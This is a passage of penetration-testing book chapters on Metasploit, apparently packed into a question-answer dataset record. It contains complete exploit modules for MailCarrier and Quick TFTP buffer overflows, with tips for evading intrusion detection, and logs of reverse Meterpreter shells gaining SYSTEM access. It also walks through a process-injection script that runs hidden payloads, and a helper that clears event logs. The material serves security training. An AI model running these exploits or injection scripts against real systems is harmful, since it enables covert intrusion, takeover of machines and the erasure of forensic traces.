192.168.1.101\nLHOST => 192.168.1.101\nmsf exploit(mailcarrier_book) > set RHOST 192.168.1.155\nRHOST => 192.168.1.155\n(cid:88) msf exploit(mailcarrier_book) > set payload generic/debug_trap\npayload => generic/debug_trap\nmsf exploit(mailcarrier_book) > exploit\n[*] Exploit completed, but no session was created.\nmsf exploit(mailcarrier_book) >\nWe set the options as if we were running a normal exploit, except that we\nuse the generic/debug_trap payload (cid:88) to test our exploit.\nAfter the module runs, the debugger should pause with EIP overwritten\nby 42424242 as shown in Figure 15-1; if you see a successful EIP overwrite\nof42424242, you know your exploit is working. Notice in Figure 15-1 that the\nEIP register points to 42424242 and that the NOP slide and the dummy pay-\nload have made it into the buffer as expected.\n220 Chapter 15\nFigure 15-1: MailCarrier initial overwrite\nImplementing Features of the Framework\nHaving proved that the basic skeleton of the module works by overwriting\nour EIP address, we can slowly start to implement the features of the Frame-\nwork. We begin by setting the target return address (shown in bold in the fol-\nlowing example) in the 'Targets' block to a JMP ESP address. This is the same\naddress that was used in the original exploit; it’s found in SHELL32.DLL on\nWindows XP SP2. We need to find a legitimate return address to ensure\nthat our code executes properly on the operating system we are targeting.\nRemember that some exploits work only on specific operating systems, as\nisthe case with this exploit. We are using an address from SHELL32.DLL,\nwhich will change across different versions or service packs. If we were to find\na standard JMP ESP in the application’s memory address, we would not need\nto use a Windows DLL and could make this exploit universal to all Windows\nplatforms, because the memory addresses would never change.\n'Targets' =>\n[\n[ 'Windows XP SP2 - EN', { 'Ret' => 0x7d17dd13 } ],\n],\nMetasploit will add the return address into the exploit at run time. You can\nreplace the return address in the exploit block with [target['Ret']].pack('V').\nThis will insert the target return address into the exploit, reversing the bytes\nin little-endian format. (The endian-ness is determined by the target CPU’s\narchitecture, and processors that are Intel-compatible use little-endian byte\nordering.)\nPorting Exploits to the Metasploit Framework 221\nNOTE If you declared more than one target, this particular line would select the proper return\naddress based on the target you selected when running the exploit. Notice how moving\nthe exploit to the Framework is already adding versatility.\nsploit = \"EHLO \"\nsploit << \"\\x41\" * 5093\nsploit << [target['Ret']].pack('V')\nsploit << \"\\x90\" * 32\nsploit << \"\\xcc\" * 1000\nRe-executing the exploit module should result in a successful jump to\nthe INT3 dummy shellcode instructions, as shown in Figure 15-2.\nFigure 15-2: A successful jump to dummy shellcode; we are at our user control’s INT3\ninstructions.\nAdding Randomization\nMost intrusion detections systems will trigger an alert when they detect a long\nstring of As traversing the network, because this is a common buffer pattern for\nexploits. Therefore, it’s best to introduce as much randomization as possible\ninto your exploits, because doing so will break many exploit-specific signatures.\nTo add randomness to this exploit, edit the 'Targets' section in the super\nblock to include the offset amount required prior to overwriting EIP, as\nshown here:\n'Targets' =>\n[\n(cid:88)[ 'Windows XP SP2 - EN', { 'Ret' => 0x7d17dd13, 'Offset' => 5093 } ],\n],\n222 Chapter 15\nBy declaring the Offset here (cid:88), you will no longer need to include the\nstring of As manually in the exploit itself. This is a very useful feature, because\nin some cases the buffer length will differ across different operating system\nversions.\nWe can now edit the exploit section to have Metasploit generate a ran-\ndom string of uppercase alphabetic characters instead of the 5093 As at run-\ntime. From this point on, each run of the exploit will have a unique buffer.\n(We’ll use rand_text_alpha_upper to accomplish this, but we aren’t limited to\nthis one engine. To see all available text formats, see the text.rb file located\nonBack|Track under /opt/metasploit/msf3/lib/rex/.)\nsploit = \"EHLO \"\nsploit << rand_text_alpha_upper(target['Offset']\nsploit << [target['Ret']].pack('V')\nsploit << \"\\x90\" * 32\nsploit << \"\\xcc\" * 1000\nAs you can see, the string of As will be replaced with a random string of\nuppercase alphanumeric characters. And when we run the module again, it\nstill works properly.\nRemoving the NOP Slide\nOur next step is to remove the very obvious NOP slide, because this is another\nitem that often triggers intrusion detection systems. Although \\x90 is the best-\nknown no-operation instruction, it isn’t the only one available. We can use\nthe make_nops() function to tell Metasploit to use random NOP-equivalent\ninstructions in the module:\nsploit = \"EHLO \"\nsploit << rand_text_alpha_upper(target['Offset'])\nsploit << [target['Ret']].pack('V')\nsploit << make_nops(32)\nsploit << \"\\xcc\" * 1000\nWe run the module again and check our debugger, which should be\npaused again on the INT3 instructions. The familiar NOP slide has been\nreplaced by seemingly random characters, as shown in Figure 15-3.\nRemoving the Dummy Shellcode\nWith everything in the module working correctly, we can now remove the\ndummy shellcode. The encoder will exclude the bad characters declared in\nthe module super block.\nsploit = \"EHLO \"\nsploit << rand_text_alpha_upper(target['Offset'])\nsploit << [target['Ret']].pack('V')\nsploit << make_nops(32)\nsploit << payload.encoded\nPorting Exploits to the Metasploit Framework 223\nFigure 15-3: Randomized MailCarrier buffer\nThe payload.encoded function tells Metasploit to append the indicated\npayload to the end of the malicious string at run time.\nNow, when we load our module, set a real payload, and execute it, we\nshould be presented with our hard-earned shell, as shown here:\nmsf exploit(mailcarrier_book) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(mailcarrier_book) > exploit\n[*] Started reverse handler on 192.168.1.101:4444\n[*] Sending stage (747008 bytes)\n[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.155:1265)\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter >\nOur Completed Module\nJust to wrap things up, here is the complete and final code for this Metasploit\nexploit module:\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\nRank = GoodRanking\ninclude Msf::Exploit::Remote::Tcp\n224 Chapter 15\ndef initialize(info = {})\nsuper(update_info(info,\n'Name' => 'TABS MailCarrier v2.51 SMTP EHLO Overflow',\n'Description' => %q{\nThis module exploits the MailCarrier v2.51 suite SMTP service.\nThe stack is overwritten when sending an overly long EHLO command.\n},\n'Author' => [ 'Your Name' ],\n'Arch' => [ ARCH_X86 ],\n'License' => MSF_LICENSE,\n'Version' => '$Revision: 7724 $',\n'References' =>\n[\n[ 'CVE', '2004-1638' ],\n[ 'OSVDB', '11174' ],\n[ 'BID', '11535' ],\n[ 'URL', 'http://www.exploit-db.com/exploits/598' ],\n],\n'Privileged' => true,\n'DefaultOptions' =>\n{\n'EXITFUNC' => 'thread',\n},\n'Payload' =>\n{\n'Space' => 1000,\n'BadChars' => \"\\x00\\x0a\\x0d\\x3a\",\n'StackAdjustment' => -3500,\n},\n'Platform' => ['win'],\n'Targets' =>\n[\n[ 'Windows XP SP2 - EN', { 'Ret' => 0x7d17dd13, 'Offset' => 5093 }\n],\n],\n'DisclosureDate' => 'Oct 26 2004',\n'DefaultTarget' => 0))\nregister_options(\n[\nOpt::RPORT(25),\nOpt::LHOST(), # Required for stack offset\n], self.class)\nend\ndef exploit\nconnect\nsploit = \"EHLO \"\nsploit << rand_text_alpha_upper(target['Offset'])\nsploit << [target['Ret']].pack('V')\nsploit << make_nops(32)\nsploit << payload.encoded\nPorting Exploits to the Metasploit Framework 225\nsock.put(sploit + \"\\r\\n\")\nhandler\ndisconnect\nend\nend\nYou’ve just completed your first port of a buffer overflow exploit to\nMetasploit!\nSEH Overwrite Exploit\nIn our next example, we’ll convert a Structured Exception Handler (SEH)\noverwrite exploit for Quick TFTP Pro 2.1 to Metasploit. SEH overwrites occur\nwhen you overwrite the pointer to the applications exception handler. In this\nparticular exploit, the application triggers an exception, and when it arrives\nat the pointer over which you have control, you can direct execution flow to\nyour shellcode. The exploit itself is a bit more complex than a simple buffer\noverflow, but it’s very elegant. In an SEH overwrite, we attempt to bypass the\nhandler that tries to close an application gracefully when a major error or\ncrash occurs.\nIn the balance of this chapter, we’ll use the POP-POP-RETN technique\ntoallow us to access our attacker-controlled memory space and gain full\ncodeexecution. The POP-POP-RETN technique is commonly used to try to\nget around the SEH and execute our own code. The first POP in assembly\npulls a memory address from the stack, essentially removing one memory\naddress instruction. The second POP also pulls a memory address from the\nstack. The RETN returns us to a user-controlled area of the code, where we\ncan begin executing our memory instructions.\nNOTE To learn more about SEH overwrites, see http://www.exploit-db.com/download_pdf/\n10195/.\nThe Quick TFTP Pro 2.1 exploit was written by Muts. You can find the code\nfor the complete exploit as well as the application at http://www.exploit-db.com/\nexploits/5315/. We’ve stripped down the exploit here to make it simpler to port\ninto Metasploit—for example, we’ve stripped out the payload. The remaining\nskeleton has all of the information we’ll need to use the exploit in Metasploit.\n#!/usr/bin/python\n# Quick TFTP Pro 2.1 SEH Overflow (0day)\n# Tested on Windows XP SP2.\n# Coded by Mati Aharoni\n# muts..at..offensive-security.com\n# http://www.offensive-security.com/0day/quick-tftp-poc.py.txt\n#########################################################\nimport socket\nimport sys\n226 Chapter 15\nprint \"[*] Quick TFTP Pro 2.1 SEH Overflow (0day)\"\nprint \"[*] http://www.offensive-security.com\"\nhost = '127.0.0.1'\nport = 69\ntry:\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nexcept:\nprint \"socket() failed\"\nsys.exit(1)\nfilename = \"pwnd\"\nshell = \"\\xcc\" * 317\nmode = \"A\"*1019+\"\\xeb\\x08\\x90\\x90\"+\"\\x58\\x14\\xd3\\x74\"+\"\\x90\"*16+shell\nmuha = \"\\x00\\x02\" + filename+ \"\\0\" + mode + \"\\0\"\nprint \"[*] Sending evil packet, ph33r\"\ns.sendto(muha, (host, port))\nprint \"[*] Check port 4444 for bindshell\"\nAs we did with our previous JMP ESP example, we first create a skeleton for\nour new module by using a base example of an exploit similar to the one we used\npreviously:\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\n(cid:88)include Msf::Exploit::Remote::Udp\n(cid:89)include Msf::Exploit::Remote::Seh\ndef initialize(info = {})\nsuper(update_info(info,\n'Name' => 'Quick TFTP Pro 2.1 Long Mode Buffer Overflow',\n'Description' => %q{\nThis module exploits a stack overflow in Quick TFTP Pro 2.1.\n},\n'Author' => 'Your Name',\n'Version' => '$Revision: 7724 $',\n'References' =>\n[\n['CVE', '2008-1610'],\n['OSVDB', '43784'],\n['URL', 'http://www.exploit-db.com/exploits/5315'],\n],\n'DefaultOptions' =>\n{\n'EXITFUNC' => 'thread',\n},\nPorting Exploits to the Metasploit Framework 227\n'Payload' =>\n{\n'Space' => 412,\n'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n'StackAdjustment' => -3500,\n},\n'Platform' => 'win',\n'Targets' =>\n[\n[ 'Windows XP SP2', { 'Ret' => 0x41414141 } ],\n],\n'Privileged' => true,\n'DefaultTarget' => 0,\n'DisclosureDate' => 'Mar 3 2008'))\n(cid:90)register_options([Opt::RPORT(69)], self.class)\nend\ndef exploit\nconnect_udp\nprint_status(\"Trying target #{target.name}...\")\n(cid:91)udp_sock.put(sploit)\ndisconnect_udp\nend\nend\nBecause this exploit uses the Trivial File Transfer Protocol (TFTP), we\nneed to include the Msf::Exploit::Remote::Udp mixin shown at (cid:88). And because\nit manipulates the structured exception handler, we also need to include the\nMsf::Exploit::Remote::Seh mixin shown at (cid:89) to gain access to certain functions\nthat deal with SEH overflows. Because TFTP servers typically listen on UDP\nport 69, we declare that port at (cid:90) as the default for the module. Lastly, once\nthe malicious string is built, the code is put on the wire at (cid:91).\nWe begin by using the same skeleton from our original Python exploit\nearlier in this chapter for the TFTP exploit. We will be adding the major\nparts of it into our exploit section.\ndef exploit\nconnect_udp\nprint_status(\"Trying target #{target.name}...\")\nevil = \"\\x41\" * 1019\n(cid:88)evil << \"\\xeb\\x08\\x90\\x90\" # Short Jump\n(cid:89)evil << \"\\x58\\x14\\xd3\\x74\" # POP-POP-RETN\nevil << \"\\x90\" * 16 # NOP slide\nevil << \"\\xcc\" * 412 # Dummy Shellcode\n228 Chapter 15\n(cid:90)sploit = \"\\x00\\x02\"\nsploit << \"pwnd\"\nsploit << \"\\x00\"\nsploit << evil\nsploit << \"\\x00\"\nudp_sock.put(sploit)\ndisconnect_udp\nend\nFollowing the initial string of As (1019 of them, represented by \\x41 in hexa-\ndecimal), we add a short jump at (cid:88) to overwrite the Next SE Handler (NSEH).\nAt the beginning of this chapter, we used a simple stack overflow example when\nwe attacked MailCarrier and overwrote the instruction pointer. Here, we over-\nwrite the SEH and the NSEH to break out of the structured exception handler.\nThen at (cid:89) we add the address of a POP-POP-RETN sequence of instructions to\noverwrite SEH, which puts us into an area of memory that we control.\nNext, to make sure that the packet will be recognized as a write request\nby the TFTP server, we append \\x00\\x02 after the shellcode at (cid:90).\nNow, when we load the module and run it against our target, our debugger\nshould pause with a SEH overwrite, as shown in Figure 15-4.\nFigure 15-4: Quick TFTP's initial SEH overwrite\nBecause that long string of As and the NOP slide sent to the application\nwill set off IDS alarms, we’ll replace the As (as in the previous example) with\na random selection of uppercase alphabetic characters, and replace the \\x90\ncharacters with NOP equivalents, as shown in the following boldface code:\nevil = rand_text_alpha_upper(1019) # Was: \"\\x41\" * 1019\nevil << \"\\xeb\\x08\\x90\\x90\" # Short Jump\nevil << \"\\x58\\x14\\xd3\\x74\" # pop/pop/ret\nevil << make_nops(16) # Was: \"\\x90\" * 16 # NOP slide\nevil << \"\\xcc\" * 412 # Dummy Shellcode\nAs always, it’s a good idea to check your new module’s functionality after\nevery change. As you can see in Figure 15-5, the random characters have been\naccepted by the application and SEH is still controlled as it was before.\nPorting Exploits to the Metasploit Framework 229\nFigure 15-5: Quick TFTP buffer with random characters\nNow that we know that the module is still behaving properly, we can set\nthe return address in the 'Targets' definition. The address in this example is\na POP-POP-RETN from oledlg.dll, as in the original exploit. Remember that if\nwe can find a memory instruction set in the same application that is loaded\nevery time, we can create a universal exploit that is not dependent on Microsoft\nDLLs and that can target every operating system. In this case, we use oledlg.dll\nto make this exploit universal.\n'Targets' =>\n[\n(cid:88)[ 'Windows XP SP2', { 'Ret' => 0x74d31458 } ], # p/p/r oledlg\n],\nWe now have our target of Windows XP SP2 and a return address of\n0x74d31458, as shown at (cid:88).\nNext, we create a random, alphabetical, uppercase string of 1019 bytes:\nevil = rand_text_alpha_upper(1019)\nevil << generate_seh_payload(target.ret)\nevil << make_nops(16)\nThe generate_seh_payload function uses the declared return address and\nwill automatically insert the short jump (which jumps us over the SEH han-\ndler). The generate_seh_payload function calculates the jumps for us, so it will\ngo straight to the POP-POP-RETN.\nWe run the module one last time with the dummy shellcode and see that\nour debugger contains numerous random characters, but everything is still\nunder our direct control, as shown in Figure 15-6. Random characters can be\nbetter than NOPs in some cases, because they serve to trip up many IDSs that\nmay be monitoring the network. Many signature-based IDSs can trigger over\nlarge volumes of NOPs.\n230 Chapter 15\nFigure 15-6: Quick TFTP fully controlled\nNext, we remove the dummy shellcode and run the module with a real\npayload to get our shell, as shown here:\nmsf > use exploit/windows/tftp/quicktftp_book\nmsf exploit(quicktftp_book) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(quicktftp_book) > set LHOST 192.168.1.101\nLHOST => 192.168.1.101\nmsf exploit(quicktftp_book) > set RHOST 192.168.1.155\nRHOST => 192.168.1.155\nmsf exploit(quicktftp_book) > exploit\n[*] Started reverse handler on 192.168.1.101:4444\n[*] Trying target Windows XP SP2...\n[*] Sending stage (747008 bytes)\n[*] Meterpreter session 2 opened (192.168.1.101:4444 -> 192.168.1.155:1036)\nmeterpreter > getuid\nServer username: V-XP-SP2-BARE\\Administrator\nNow that we have our Meterpreter shell, we’ve successfully ported an\nexploit and used the Framework in an SEH exploit!\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\ninclude Msf::Exploit::Remote::Udp\ninclude Msf::Exploit::Remote::Seh\ndef initialize(info = {})\nsuper(update_info(info,\n'Name' => 'Quick TFTP Pro 2.1 Long Mode Buffer Overflow',\n'Description' => %q{\nThis module exploits a stack overflow in Quick TFTP Pro 2.1.\n},\nPorting Exploits to the Metasploit Framework 231\n'Author' => 'Your Name',\n'Version' => '$Revision: 7724 $',\n'References' =>\n[\n['CVE', '2008-1610'],\n['OSVDB', '43784'],\n['URL', 'http://www.exploit-db.com/exploits/5315'],\n],\n'DefaultOptions' =>\n{\n'EXITFUNC' => 'thread',\n},\n'Payload' =>\n{\n'Space' => 412,\n'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n'StackAdjustment' => -3500,\n},\n'Platform' => 'win',\n'Targets' =>\n[\n[ 'Windows XP SP2', { 'Ret' => 0x74d31458 } ],\n# p/p/r oledlg\n],\n'Privileged' => true,\n'DefaultTarget' => 0,\n'DisclosureDate' => 'Mar 3 2008'))\nregister_options([Opt::RPORT(69)], self.class)\nend\ndef exploit\nconnect_udp\nprint_status(\"Trying target #{target.name}...\")\nevil = rand_text_alpha_upper(1019)\nevil << generate_seh_payload(target.ret)\nevil << make_nops(16)\nsploit = \"\\x00\\x02\"\nsploit << \"pwnd\"\nsploit << \"\\x00\"\nsploit << evil\nsploit << \"\\x00\"\nudp_sock.put(sploit)\ndisconnect_udp\nend\nend\n232 Chapter 15\nWrapping Up\nThis chapter was designed to help you understand how to port different\nstand-alone exploits into the Metasploit Framework. You can import into the\nFramework in a number of ways, and different exploits will require different\napproaches and techniques.\nAt the beginning of this chapter, you learned how to use some basic\nassembly instructions to perform a simple stack overflow and port it into the\nFramework. We moved on to SEH overwrites, which we were able to use to\nmaneuver around the handler and gain remote code execution. We used a\npop/pop/ret technique to gain the ability to execute code remotely, and we\nused Metasploit to open a Meterpreter shell.\nIn the next chapter, we will begin to dive into the Meterpreter scripting\nlanguage and post exploitation modules. When we compromise a system and\nleverage Meterpreter, we can perform a number of additional attacks. We’ll\ncreate our own Meterpreter scripts and learn how the Framework is structured\nand how use it to maximum effect.\nPorting Exploits to the Metasploit Framework 233"
  },
  {
    "input": "What is the process for creating and running a custom Meterpreter script to upload and execute another Meterpreter executable on a target system?",
    "summary": "",
    "output": "M E T E R P R E T E R S C R I P T I N G\nMetasploit’s powerful scripting environment lets you\nadd features or options to Meterpreter. In this chapter,\nyou’ll learn the basics of Meterpreter scripting, some\nuseful native calls, and learn how to run these com-\nmands from within Meterpreter. We’ll cover two ways\nto leverage Meterpreter scripting. The first method is somewhat outdated\nbut still important, because not all scripts have been converted. The second\nmethod is nearly identical to the one discussed in Chapter 13, so we won’t\ncover it in detail in this chapter. (Special thanks to Carlos Perez [darkoperator]\nfor his contributions to this chapter.)\nMeterpreter Scripting Basics\nAll Meterpreter scripts are located under the Framework root under scripts/\nmeterpreter/. To show a listing of all scripts, press the TAB key in a Meterpreter\nshell, enter run, and press TAB again.\nLet’s dissect a simple Meterpreter script and then build our own. We’ll\nexplore the multi_meter_inject script that injects Meterpreter shells into\ndifferent processes. To begin, take a look at this script in Meterpreter to see\nwhat flags and syntax are included:\nmeterpreter > run multi_meter_inject -h\nMeterpreter script for injecting a reverse tcp Meterpreter payload into memory space of\nmultiple PID's. If none is provided, notepad.exe will be spawned and the meterpreter\npayload injected into it.\nOPTIONS:\n-h Help menu.\n-m (cid:88) Start Exploit multi/handler for return connection\n-mp (cid:89)<opt> Provide Multiple PID for connections separated by comma one per IP.\n-mr (cid:90)<opt> Provide Multiple IP Addresses for Connections separated by comma.\n-p (cid:91)<opt> The port on the remote host where Metasploit is listening (default: 4444)\n-pt <opt> Specify Reverse Connection Meterpreter Payload. Default windows/\nmeterpreter/reverse_tcp\nmeterpreter >\nThe first option is the -m flag (cid:88), which automatically sets up a new handler\nfor us on the return connection. We would not need to set this option if we\nwere going to use the same port (for example, 443). Next we specify the pro-\ncess IDs (PIDs) (cid:89) that we need and the shells into which they will be injected.\nMeterpreter executes in memory only. When we inject into a process, we\nare injecting Meterpreter into the memory space of that process. This allows\nus to remain stealthy, never reading or writing files to disk, while ultimately\nhaving multiple shells available to us.\nWe then set the IP address (cid:90) and port number (cid:91) on the attacking machine\nto which we want the new Meterpreter session to connect.\nWe issue the ps command within Meterpreter to get a list of running\nprocesses:\nmeterpreter > ps\nProcess list\n============\nPID Name Arch Session User Path\n--- ---- ---- ------- ---- ----\n0 [System Process]\n4 System\n256 smss.exe\n364 csrss.exe\n412 wininit.exe\n424 csrss.exe\n472 winlogon.exe\n516 services.exe\n524 lsass.exe\n532 lsm.exe\n2808 iexplorer.exe (cid:88) x86\nmeterpreter >\n236 Chapter 16\nWe’ll inject our new Meterpreter shell into the iexplorer.exe(cid:88) process.\nThis will spawn a second Meterpreter console completely within memory and\nwill never write data to the disk.\nLet’s run the multi_meter_inject command using some of the switches we\nreviewed earlier to see if it works:\nmeterpreter > run multi_meter_inject -mp 2808 -mr 172.16.32.129 -p 443\n[*] Creating a reverse meterpreter stager: LHOST=172.16.32.129 LPORT=443\n[*] Injecting meterpreter into process ID 2808\n[*] Allocated memory at address 0x03180000, for 290 byte stager\n[*] Writing the stager into memory...\n[*] Sending stage (749056 bytes) to 172.16.32.170\n[+] Successfully injected Meterpreter in to process: 2808\n(cid:88) [*] Meterpreter session 3 opened (172.16.32.129:443 -> 172.16.32.170:1098) at\nTue Nov 30 22:37:29 -0500 2010\nmeterpreter >\nAs this output indicates, our command was successful and a new Meter-\npreter session has been opened, as shown at (cid:88).\nNow that you understand what this script can do, let’s examine how it\nworks. We’ll break the script into chunks to help us parse its commands and\noverall structure.\nFirst, variables and definitions are defined and the flags we want to pass\nto Meterpreter are set up:\n# $Id: multi_meter_inject.rb 10901 2010-11-04 18:42:36Z darkoperator $\n# $Revision: 10901 $\n# Author: Carlos Perez at carlos_perez[at]darkoperator.com\n#-----------------------------------------------------------------------------\n################## Variable Declarations ##################\n@client = client\nlhost = Rex::Socket.source_address(\"1.2.3.4\")\nlport = 4444\nlhost = \"127.0.0.1\"\n(cid:88) pid = nil\nmulti_ip = nil\nmulti_pid = []\npayload_type = \"windows/meterpreter/reverse_tcp\"\nstart_handler = nil\n(cid:89) @exec_opts = Rex::Parser::Arguments.new(\n\"-h\" => [ false, \"Help menu.\" ],\n\"-p\" => [ true, \"The port on the remote host where Metasploit is\nlistening (default: 4444)\"],\n\"-m\" => [ false, \"Start Exploit multi/handler for return connection\"],\n\"-pt\" => [ true, \"Specify Reverse Connection Meterpreter Payload.\nDefault windows/meterpreter/reverse_tcp\"],\n\"-mr\" => [ true, \"Provide Multiple IP Addresses for Connections\nseparated by comma.\"],\n\"-mp\" => [ true, \"Provide Multiple PID for connections separated by\ncomma one per IP.\"]\n)\nmeter_type = client.platform\nMeterpreter Scripting 237\nAt the beginning of this section of script, notice that several variables are\ndefined for later use. For example, pid = nil at (cid:88) creates a PID variable but\nits value is not set. The @exec_opts = Rex::Parser::Arguments.new( section at (cid:89)\ndefines the additional help commands and flags that will be used.\nThe next section defines functions that we will call later:\n################## Function Declarations ##################\n# Usage Message Function\n#-------------------------------------------------------------------------------\n(cid:88) def usage\nprint_line \"Meterpreter Script for injecting a reverse tcp Meterpreter Payload\"\nprint_line \"in to memory of multiple PID's, if none is provided a notepad process.\"\nprint_line \"will be created and a Meterpreter Payload will be injected in to each.\"\nprint_line(@exec_opts.usage)\nraise Rex::Script::Completed\nend\n# Wrong Meterpreter Version Message Function\n#-------------------------------------------------------------------------------\ndef wrong_meter_version(meter = meter_type)\nprint_error(\"#{meter} version of Meterpreter is not supported with this Script!\")\nraise Rex::Script::Completed\nend\n# Function for injecting payload in to a given PID\n#-------------------------------------------------------------------------------\n(cid:89) def inject(target_pid, payload_to_inject)\nprint_status(\"Injecting meterpreter into process ID #{target_pid}\")\nbegin\nhost_process = @client.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS)\nraw = payload_to_inject.generate\n(cid:90)mem = host_process.memory.allocate(raw.length + (raw.length % 1024))\nprint_status(\"Allocated memory at address #{\"0x%.8x\" % mem}, for\n#{raw.length} byte stager\")\nprint_status(\"Writing the stager into memory...\")\n(cid:91)host_process.memory.write(mem, raw)\n(cid:92)host_process.thread.create(mem, 0)\nprint_good(\"Successfully injected Meterpreter in to process: #{target_pid}\")\nrescue::Exception => e\nprint_error(\"Failed to Inject Payload to #{target_pid}!\")\nprint_error(e)\nend\nend\nIn this example, the function usage at (cid:88) will be called when the -h flag is\nset. You can call a number of Meterpreter functions directly from the Meter-\npreter API. This functionality simplifies certain tasks, such as injecting into a\nnew process with the def inject function, as shown at (cid:89).\nThe next important element is the host_process.memory.allocate call at (cid:90),\nwhich will allow us to allocate memory space for our Meterpreter payload.\n238 Chapter 16\nWe then write the memory to our process using host_process.memory.write at (cid:91)\nand create a new thread using host_process.thread.create at (cid:92).\nNext we define the multi-handler that handles the connections based\non the selected payload, as shown in boldface in the following output. (The\ndefault is Meterpreter, so the multi-handler will handle Meterpreter sessions\nunless otherwise specified.)\n# Function for creation of connection handler\n#-------------------------------------------------------------------------------\ndef create_multi_handler(payload_to_inject)\nmul = @client.framework.exploits.create(\"multi/handler\")\nmul.share_datastore(payload_to_inject.datastore)\nmul.datastore['WORKSPACE'] = @client.workspace\nmul.datastore['PAYLOAD'] = payload_to_inject\nmul.datastore['EXITFUNC'] = 'process'\nmul.datastore['ExitOnSession'] = true\nprint_status(\"Running payload handler\")\nmul.exploit_simple(\n'Payload' => mul.datastore['PAYLOAD'],\n'RunAsJob' => true\n)\nend\nThe pay = client.framework.payloads.create(payload) call in the following\nsection allows us to create a payload from the Metasploit Framework. Because\nwe know this is a Meterpreter payload, Metasploit will automatically generate\nit for us.\n# Function for Creating the Payload\n#-------------------------------------------------------------------------------\ndef create_payload(payload_type,lhost,lport)\nprint_status(\"Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}\")\npayload = payload_type\npay = client.framework.payloads.create(payload)\npay.datastore['LHOST'] = lhost\npay.datastore['LPORT'] = lport\nreturn pay\nend\nThe next option spawns a process using Notepad by default. If we didn’t\nspecify a process, it would have created a Notepad process for us automatically.\n# Function that starts the notepad.exe process\n#-------------------------------------------------------------------------------\ndef start_proc()\nprint_good(\"Starting Notepad.exe to house Meterpreter Session.\")\nproc = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })\nprint_good(\"Process created with pid #{proc.pid}\")\nreturn proc.pid\nend\nMeterpreter Scripting 239\nThe boldfaced call lets us execute any command on the operating system.\nNotice that Hidden is set to true. This means that the user on the other side\n(the target) will not see anything; if Notepad is opened, it will run without\nthe target user’s knowledge.\nNext we call our functions, throw if statements, and start the payload:\n################## Main ##################\n@exec_opts.parse(args) { |opt, idx, val|\ncase opt\nwhen \"-h\"\nusage\nwhen \"-p\"\nlport = val.to_i\nwhen \"-m\"\nstart_handler = true\nwhen \"-pt\"\npayload_type = val\nwhen \"-mr\"\nmulti_ip = val.split(\",\")\nwhen \"-mp\"\nmulti_pid = val.split(\",\")\nend\n}\n# Check for Version of Meterpreter\nwrong_meter_version(meter_type) if meter_type !~ /win32|win64/i\n# Create a Multi Handler is Desired\ncreate_multi_handler(payload_type) if start_handler\nFinally, we go through a couple of checks, make sure the syntax is correct,\nand inject our new Meterpreter session into our PID:\n# Check for a PID or program name\nif multi_ip\nif multi_pid\nif multi_ip.length == multi_pid.length\npid_index = 0\nmulti_ip.each do |i|\npayload = create_payload(payload_type,i,lport)\ninject(multi_pid[pid_index],payload)\nselect(nil, nil, nil, 5)\npid_index = pid_index + 1\nend\nelse\nmulti_ip.each do |i|\npayload = create_payload(payload_type,i,lport)\ninject(start_proc,payload)\nselect(nil, nil, nil, 2)\nend\nend\nend\n240 Chapter 16\nelse\nprint_error(\"You must provide at least one IP!\")\nend\nMeterpreter API\nDuring a penetration test, you might be unable to find an existing script that\nmatches what you need in order to perform a required task. If you under-\nstand the basic concepts of programming, it should be relatively easy for you\nto pick up the Ruby syntax and use it to write additional scripts.\nLet’s start off with a basic print statement that uses the interactive Ruby\nshell, also known as irb. From the Meterpreter console, issue the irb command\nand begin typing commands:\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The 'client' variable holds the meterpreter client\n>>\nAfter you are inside the interactive shell, you can use it to test the differ-\nent API calls from Meterpreter.\nPrinting Output\nLet’s start with the print_line() call, which will print the output and add a\ncarriage return at the end:\n>> print_line(\"you have been pwnd!\")\nyou have been pwnd!\n=> nil\nThe next call is print_status() and is used most often in the scripting\nlanguage. This call will provide a carriage return and print the status of what-\never is executing, with a [*] prefixed at the beginning:\n>> print_status(\"you have been pwnd!\")\n[*] you have been pwnd!\n=> nil\nThe next call is print_good(), which is used to provide the results of an\naction or to indicate that the action was successful:\n>> print_good(\"you have been pwnd\")\n[+] you have been pwnd\n=> nil\nMeterpreter Scripting 241\nThe next call is print_error(), which is used to provide an error message\nor to indicate that an action was not possible:\n>> print_error(\"you have been pwnd!\")\n[-] you have been pwnd!\n=> nil\nBase API Calls\nMeterpreter includes many API calls that you can use in your scripts to provide\nadditional functionality or customization. You can use several reference points\nfor these API calls. The one most often used by scripting newbies looks at how\nthe Meterpreter console user interface (UI) uses the calls; these can be used\nas a base to continue writing scripts. To access this code, read the files under\n/opt/framework3/msf3/lib/rex/post/meterpreter/ui/console/command_dispatcher/ in\nBack|Track. If you create a listing of the folder contents, you can see the files\nthat contain various commands that you can use:\nroot@bt:~# ls -F /opt/framework3/msf3/lib/rex/post/meterpreter/ui/console/\ncommand_dispatcher/\ncore.rb espia.rb incognito.rb networkpug.rb priv/ priv.rb sniffer.rb\nstdapi/ stdapi.rb\nWithin these scripts are the various Meterpreter core, desktop interaction,\nprivileged operations, and many more commands. Review these scripts to\nbecome intimately familiar with how Meterpreter operates within a compro-\nmised system.\nMeterpreter Mixins\nThe Meterpreter mixins are a series of calls that represent the most common\ntasks undertaken in a Meterpreter script. These calls are not available in irb\nand can be used only when creating a script for Meterpreter. Following is a\nlist of some of the most notable calls:\ncmd_exec(cmd) Executes the given command as hidden and channelized.\nThe output of the command is provided as a multiline string.\neventlog_clear(evt = \"\") Clears a given event log or all event logs if none\nis given. Returns an array of event logs that were cleared.\neventlog_list() Enumerates the event logs and returns an array contain-\ning the names of the event logs.\nfile_local_digestmd5(file2md5) Returns a string with the MD5 checksum\nof a given local file.\nfile_local_digestsha1(file2sha1) Returns a string with the SHA1 check-\nsum of a given 